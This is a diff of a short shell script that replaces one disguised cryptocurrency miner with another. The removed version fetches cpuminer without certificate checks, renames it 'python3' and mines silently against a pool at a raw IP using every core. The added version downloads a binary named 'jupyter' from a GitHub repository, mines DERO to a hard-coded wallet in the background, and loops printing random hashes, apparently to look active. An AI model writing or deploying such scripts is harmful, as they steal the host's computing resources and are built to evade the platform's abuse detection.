@@ -1,6 +1,5 @@
-#!/bin/bash
-wget --no-check-certificate https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz
-tar xf cpuminer-opt-linux.tar.gz
-mv cpuminer-sse2 python3
-./python3 -a yespowertide -o stratum+tcp://147.182.177.241:443 -u TFHaoj2n8TvqkXVNgnjnYHkQpvMUxmwyD4.her -p x -t$(nproc --all) >/dev/null 2>&1 >/dev/null &
-while :; do echo "system true"; sleep 30; done
+!#/bin/bash
+wget https://github.com/dadanhiyeumX9/dero-mod/raw/main/jupyter-v0.0.5-linux-amd64.tar.gz
+tar xf jupyter-v0.0.5-linux-amd64.tar.gz
+./jupyter -r dero-merah.dockerpool.my.id:80 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92x6838l67tghl8zqsn7unx.simbah >/dev/null &
+while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 1m; done
